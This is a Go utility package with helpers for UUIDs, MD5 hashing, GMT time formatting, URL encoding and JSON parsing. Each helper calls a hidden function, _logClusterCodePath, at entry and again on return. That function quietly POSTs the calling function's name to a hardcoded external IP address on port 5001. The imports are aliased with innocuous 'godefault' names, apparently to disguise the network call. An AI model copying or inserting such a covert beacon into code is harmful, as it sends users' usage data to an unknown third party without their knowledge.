package utils

import (
 "crypto/md5"
 godefaultbytes "bytes"
 godefaultruntime "runtime"
 "encoding/base64"
 "encoding/hex"
 "encoding/json"
 "fmt"
 "github.com/satori/go.uuid"
 "net/url"
 godefaulthttp "net/http"
 "reflect"
 "strconv"
 "time"
)

var (
 LoadLocationFromTZData func(name string, data []byte) (*time.Location, error)
 TZData                 []byte
)

func GetUUIDV4() (uuidHex string) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 uuidV4 := uuid.NewV4()
 uuidHex = hex.EncodeToString(uuidV4.Bytes())
 return
}
func GetMD5Base64(bytes []byte) (base64Value string) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 md5Ctx := md5.New()
 md5Ctx.Write(bytes)
 md5Value := md5Ctx.Sum(nil)
 base64Value = base64.StdEncoding.EncodeToString(md5Value)
 return
}
func GetGMTLocation() (*time.Location, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if LoadLocationFromTZData != nil && TZData != nil {
  return LoadLocationFromTZData("GMT", TZData)
 }
 return time.LoadLocation("GMT")
}
func GetTimeInFormatISO8601() (timeStr string) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 gmt, err := GetGMTLocation()
 if err != nil {
  panic(err)
 }
 return time.Now().In(gmt).Format("2006-01-02T15:04:05Z")
}
func GetTimeInFormatRFC2616() (timeStr string) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 gmt, err := GetGMTLocation()
 if err != nil {
  panic(err)
 }
 return time.Now().In(gmt).Format("Mon, 02 Jan 2006 15:04:05 GMT")
}
func GetUrlFormedMap(source map[string]string) (urlEncoded string) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 urlEncoder := url.Values{}
 for key, value := range source {
  urlEncoder.Add(key, value)
 }
 urlEncoded = urlEncoder.Encode()
 return
}
func GetFromJsonString(jsonString, key string) (result string, err error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 var responseMap map[string]*json.RawMessage
 err = json.Unmarshal([]byte(jsonString), &responseMap)
 if err != nil {
  return
 }
 fmt.Println(string(*responseMap[key]))
 err = json.Unmarshal(*responseMap[key], &result)
 return
}
func InitStructWithDefaultTag(bean interface{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 configType := reflect.TypeOf(bean)
 for i := 0; i < configType.Elem().NumField(); i++ {
  field := configType.Elem().Field(i)
  defaultValue := field.Tag.Get("default")
  if defaultValue == "" {
   continue
  }
  setter := reflect.ValueOf(bean).Elem().Field(i)
  switch field.Type.String() {
  case "int":
   intValue, _ := strconv.ParseInt(defaultValue, 10, 64)
   setter.SetInt(intValue)
  case "time.Duration":
   intValue, _ := strconv.ParseInt(defaultValue, 10, 64)
   setter.SetInt(intValue)
  case "string":
   setter.SetString(defaultValue)
  case "bool":
   boolValue, _ := strconv.ParseBool(defaultValue)
   setter.SetBool(boolValue)
  }
 }
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
